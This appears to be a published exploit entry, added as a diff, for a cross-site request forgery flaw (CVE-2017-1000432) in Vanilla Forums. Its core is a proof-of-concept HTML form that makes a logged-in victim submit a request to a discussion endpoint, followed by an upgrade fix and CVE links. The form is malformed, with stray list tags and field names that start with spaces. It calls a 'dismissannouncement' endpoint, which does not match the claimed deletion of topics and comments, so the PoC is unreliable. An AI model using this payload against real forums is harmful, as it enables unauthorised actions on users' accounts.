@@ -1,0 +1,44 @@
+# Exploit Title: CSRF vulnerabilities in Vanilla Forums below 2.1.5-CVE-2017-1000432
+# Google Dork: NA
+# Date: 7/1/2018
+# Contact: https://twitter.com/anandm47
+#   website: https://anandtechzone.blogspot.in <https://t.co/MJ8SoRaIMn>
+# Exploit Author: Anand Meyyappan
+# Vendor Homepage: https://open.vanillaforums.com <https://open.vanillaforums.com/discussion/28337/vanilla-2-1-5-released-and-2-0-18-14>
+# Software Link: https://open.vanillaforums.com/addon/vanilla-core-2.1
+# Tested on: Windows, Linux
+# CVE : CVE-2017-1000432
+
+Description
+
+
+Any registered user can delete topics and comments in forum without having admin access.
+
+
+
+2.Proof Of Concept
+
+
+
+Save the below code in html format, Once victim is logged into account. Use the below code.
+
+<form method="post" action="https://www.site.com/forum/vanilla/discussion/dismissannouncement?discussionid=3709"> 
+<input name=" DeliveryType" value="VIEW" class="input" type="hidden"> 
+<input name=" DeliveryMethod" value="JSON" class="input" type="hidden"> <li>
+<label><br></label><input value="Send" class="submit" type="submit"></li> </ul> 
+</form>
+
+3. Solution:
+
+
+Update to version 2.5
+
+https://open.vanillaforums.com/get/vanilla-core-2.5
+
+
+
+#Reference
+
+https://open.vanillaforums.com/discussion/28337/vanilla-2-1-5-released-and-2-0-18-14
+https://www.cvedetails.com/cve/CVE-2017-1000432/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-1000432
